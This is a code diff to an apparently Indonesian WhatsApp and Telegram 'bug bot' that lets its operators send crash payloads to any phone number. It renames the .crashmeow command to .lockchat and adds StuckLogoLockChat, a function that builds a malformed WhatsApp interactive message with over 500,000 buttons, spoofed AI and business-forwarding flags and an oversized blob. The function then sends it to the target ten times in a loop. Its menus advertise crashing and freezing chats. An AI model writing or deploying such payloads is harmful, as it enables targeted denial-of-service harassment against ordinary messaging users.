@@ -661,7 +661,7 @@ async function sendWAMenu(sock, from, mek, sender) {
 
 \`「 ANDROID BUG 」\`
 ▸ .delayhard 62xxx
-▸ .crashmeow 62xxx
+▸ .lockchat 62xxx
 ▸ .blankclick 62xxx
 ▸ .frezehard 62xxx
 
@@ -865,14 +865,14 @@ if (body.trim().toLowerCase() === "bubar") {
         break;
       }
 
-      case "crashmeow": {
-        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .crashmeow 628123456789" }, { quoted: mek });
+      case "lockchat": {
+        if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .lockchat 628123456789" }, { quoted: mek });
         const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-        await sock.sendMessage(from, { text: `🚀 Mengirim bug .crashmeow ke ${args[0]}...` }, { quoted: mek });
+        await sock.sendMessage(from, { text: `🚀 Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
         try {
           await bug2(sock, target);
           await bug2(sock, target);
-          await sock.sendMessage(from, { text: `✅ Bug .crashmeow terkirim ke ${args[0]}` }, { quoted: mek });
+          await sock.sendMessage(from, { text: `✅ Bug .lockchat terkirim ke ${args[0]}` }, { quoted: mek });
         } catch (e) {
           await sock.sendMessage(from, { text: `❌ Error: ${e.message}` }, { quoted: mek });
         }
@@ -1499,6 +1499,65 @@ async function delayhard(sock, target) {
     });
 }
 
+async function StuckLogoLockChat(sock, target) {
+  try {
+    const payload = {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: "JavaScript",
+              hasMediaAttachment: false
+            },
+            body: {
+              text: "LOCK CHAT BY KINTANA"
+            },
+            nativeFlowMessage: {
+              messageParamsJson: JSON.stringify({
+                placeholderResendMessage: "placeholderResendMessage",
+                testPayload: Buffer.from(
+                  Array.from({ length: 1500 }, () => 0x5A)
+                ).toString("base64")
+              }),
+              buttons: Array.from({ length: 500550 }, (_, i) => {
+                if (i === 0) {
+                  return {
+                    name: "quick_reply",
+                    buttonParamsJson: JSON.stringify({
+                      display_text: "Oke",
+                      id: "oke_btn"
+                    })
+                  };
+                }
+                return {};
+              }),
+              messageVersion: 3
+            },
+            contextInfo: {
+              forwardingScore: 999,
+              isForwarded: true,
+              isAiGenerated: true,
+              businessMessageForwardInfo: {
+                businessOwnerJid: "13135550002@s.whatsapp.net"
+              }
+            }
+          }
+        }
+      }
+    };
+
+    await sock.relayMessage(target, payload, {
+      participant: true,
+      noSelfSync: true,
+      messageId: "3EB0" + Math.random().toString(36).substring(2, 12).toUpperCase()
+    });
+
+    console.log(`[+] Meta AI Lock Chat Overlay terkirim ke ${target}`);
+  } catch (err) {
+    console.error("[-] Gagal kirim:", err.message);
+  }
+}
+
 async function halonyet(sock, target) {
     const msg = {
         groupStatusMessageV2: {
@@ -1740,7 +1799,7 @@ async function bug1(sock, target) {
 async function bug2(sock, target) {
   for (let i = 0; i < 10; i++) {
     try {
-      await halonyet(sock, target);
+      await StuckLogoLockChat(sock, target);
       console.log(`bug send to ${target}`);
     } catch (innerError) {
       console.error(`error:`, innerError);
@@ -1829,7 +1888,7 @@ function getkintanaMenu() {
 <table border="2">
 <tr><th>command</th><th>description</th></tr>
 <tr><td><code>/delayhard</code></td><td>delayy hard crash</td></tr>
-<tr><td><code>/crashmeow</code></td><td>crash whatsapp hard</td></tr>
+<tr><td><code>/lockchat</code></td><td>lock whatsapp chat</td></tr>
 <tr><td><code>/blankclick</code></td><td>crash click chat</td></tr>
 <tr><td><code>/frezehard</code></td><td>freeze chat x delay</td></tr>
 </table>
@@ -2158,7 +2217,7 @@ bot.on("callback_query", async (query) => {
 
       replyMarkup = {
         inline_keyboard: [
-          [{ text: "owner menu", callback_data: "owner_menu", style: "primary", icon_custom_emoji_id: "5352670019899652428" }, { text: "all menu", callback_data: "all_menu", style: "primary", icon_custom_emoji_id: "5350658338822574065" }],
+          [{ text: "owner menu", callback_data: "owner_menu", style: "primary", icon_custom_emoji_id: "5352670019899652428" }, { text: "all menu", callback_data: "all_menu", style: "primary", icon_custom_emoji_id: "5316977664848837418" }],
           [{ text: "kintana menu", callback_data: "kintana-menu", style: "primary", icon_custom_emoji_id: "5350658338822574065" }],
           [{ text: "thanks to", callback_data: "thanks_to", style: "primary", icon_custom_emoji_id: "5316731584697613423" }],
           [{ text: "channel", url: "https://t.me/kintanaofficial", style: "primary", icon_custom_emoji_id: "5316826301611390284" }, { text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }],
@@ -2605,7 +2664,7 @@ bot.onText(/^\/(delayhard)(?:\s+(.+))?$/, async (msg, match) => {
   }
 });
 
-bot.onText(/^\/(crashmeow)(?:\s+(.+))?$/, async (msg, match) => {
+bot.onText(/^\/(lockchat)(?:\s+(.+))?$/, async (msg, match) => {
   const chatId = msg.chat.id;
   const commandName = match[1];
   const userId = msg.from.id;
